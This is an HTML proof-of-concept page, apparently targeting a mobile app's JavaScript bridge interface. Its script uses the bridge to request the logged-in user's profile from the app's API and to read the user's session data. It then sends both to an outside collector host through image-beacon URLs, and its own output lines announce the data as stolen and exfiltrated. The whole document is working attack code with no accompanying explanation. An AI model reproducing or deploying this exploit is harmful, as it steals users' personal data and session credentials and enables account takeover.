 <!DOCTYPE html>
  <html>
  <head><title>X</title><meta charset="utf-8"></head>
  <body style="background:#000;color:#0f0;font:10px monospace;padding:10px">
  <pre id="s">Loading...</pre>
  <script>
  var B = window.B612KajiBridgeInterface;
  var s = document.getElementById('s');
  var ATTACKER = 'https://snowpoc.requestcatcher.com/';

  if (B) {
      s.textContent = 'Bridge OK\n\n';

      window.cb = function(d) {
          var x = typeof d === 'string' ? JSON.parse(d) : d;
          s.textContent += '=== USER DATA STOLEN ===\n';
          s.textContent += JSON.stringify(x, null, 2) + '\n\n';
          var img = new Image();
          img.src = ATTACKER + 'userdata?d=' + encodeURIComponent(JSON.stringify(x));
          s.textContent += 'EXFILTRATED!\n';
      };

      B.apiRequest('cb', JSON.stringify({
          url: 'https://user-snow-api.snow.me/v1/user/me',
          method: 'POST'
      }));

      window.cb2 = function(d) {
          var x = typeof d === 'string' ? JSON.parse(d) : d;
          var img = new Image();
          img.src = ATTACKER + 'session?d=' + encodeURIComponent(JSON.stringify(x));
      };
      B.getUserSession('cb2');
  } else {
      s.textContent = 'No Bridge';
  }
  </script>
  </body>
  </html>
